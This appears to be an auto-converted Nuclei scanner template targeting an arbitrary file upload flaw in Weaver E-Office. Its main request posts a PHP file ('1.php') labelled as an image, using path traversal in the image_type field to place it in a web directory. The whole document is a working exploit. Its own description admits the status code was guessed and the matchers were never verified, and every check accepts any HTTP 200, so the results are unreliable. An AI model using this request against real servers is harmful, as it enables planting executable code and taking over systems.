id: poc-19b2a6319a823c1c02d6
info:
  name: 泛微E-Officesave_image任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'GET /sample.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /general/system/interface/theme_set/save_image.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymzrNfz1ehkVc9A3Z

    Cookie: {cookie}


    ------WebKitFormBoundarymzrNfz1ehkVc9A3Z

    Content-Disposition: form-data; name="image_type"


    ../../clientTools

    ------WebKitFormBoundarymzrNfz1ehkVc9A3Z

    Content-Disposition: form-data; name="upfile"; filename="1.php"

    Content-Type: image/jpeg


    123

    ------WebKitFormBoundarymzrNfz1ehkVc9A3Z

    Content-Disposition: form-data; name="theme_name"


    theme3

    ------WebKitFormBoundarymzrNfz1ehkVc9A3Z--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /general/down.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Type: application/x-www-form-urlencoded

    Cookie: {cookie}

    Accept-Encoding: gzip'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
